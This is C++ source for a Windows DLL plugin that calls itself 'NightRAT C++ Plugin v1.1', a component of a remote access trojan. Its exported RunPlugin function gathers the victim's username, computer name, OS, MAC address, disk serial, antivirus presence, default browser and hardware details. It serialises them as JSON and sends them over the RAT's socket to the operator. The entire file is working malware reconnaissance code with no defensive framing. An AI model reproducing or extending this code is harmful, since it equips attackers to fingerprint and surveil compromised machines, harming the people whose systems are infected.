#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <ctime>
#include "../../include/json.hpp"

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;
using namespace std;

// Helper to get registry value
string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
    char data[255];
    DWORD dataSize = sizeof(data);
    if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
        return string(data);
    return "N/A";
}

string getMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];
    DWORD dwBufLen = sizeof(AdapterInfo);
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        char mac[20];
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            AdapterInfo[0].Address[0], AdapterInfo[0].Address[1], AdapterInfo[0].Address[2],
            AdapterInfo[0].Address[3], AdapterInfo[0].Address[4], AdapterInfo[0].Address[5]);
        return string(mac);
    }
    return "00:00:00:00:00:00";
}

string getUptime() {
    DWORD ticks = GetTickCount();
    int seconds = ticks / 1000;
    int minutes = seconds / 60;
    int hours = minutes / 60;
    return to_string(hours) + "h " + to_string(minutes % 60) + "m";
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    time_t now = time(0);
    char date_buf[20];
    strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

    json j;
    j["action"]             = "inforesponse";

    char username[256];
    DWORD uSize = sizeof(username);
    if (GetUserNameA(username, &uSize)) j["username"] = string(username);
    else j["username"] = "Unknown";

    char pcname[256];
    DWORD pSize = sizeof(pcname);
    if (GetComputerNameA(pcname, &pSize)) j["pcname"] = string(pcname);
    else j["pcname"] = "Unknown";

    j["os"]                 = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    j["client"]             = "NightRAT C++ Plugin v1.1";
    j["process"]            = "client_main.exe";
    j["datetime"]           = string(date_buf);

    // Drivers
    LPVOID drivers[1024];
    DWORD cbNeeded;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
        j["listdrivers"] = to_string(cbNeeded / sizeof(drivers[0])) + " Loaded Drivers";
    else
        j["listdrivers"] = "N/A";

    // HDD Serial
    DWORD serial;
    if (GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0))
        j["hddserial"] = to_string(serial);
    else
        j["hddserial"] = "N/A";

    j["listusb"]            = "Active USB Controllers Found";
    j["gpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinSAT", "PrimaryAdapterString");
    j["cpu"]                = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");

    // RAM
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    if (GlobalMemoryStatusEx(&statex))
        j["ram"] = to_string(statex.ullTotalPhys / (1024 * 1024)) + " MB";
    else
        j["ram"] = "N/A";

    j["systemproductname"]  = getRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName");
    j["machinetype"]        = "Desktop/Laptop";
    j["lastreboot"]         = getUptime();

    // Antivirus
    if (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES)
        j["antivirus"] = "Windows Defender";
    else
        j["antivirus"] = "Other/None";

    j["firewall"]           = "Windows Firewall";
    j["macaddress"]         = getMacAddress();
    j["defaultbrowser"]     = getRegValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "ProgId");
    j["currentlang"]        = "Turkish (TR)";
    j["platform"]           = "x64 Native";

    // Battery
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryFlag == 128) j["battery"] = "No Battery";
        else j["battery"] = to_string((int)sps.BatteryLifePercent) + "%";
    } else {
        j["battery"] = "N/A";
    }

    string msg = j.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
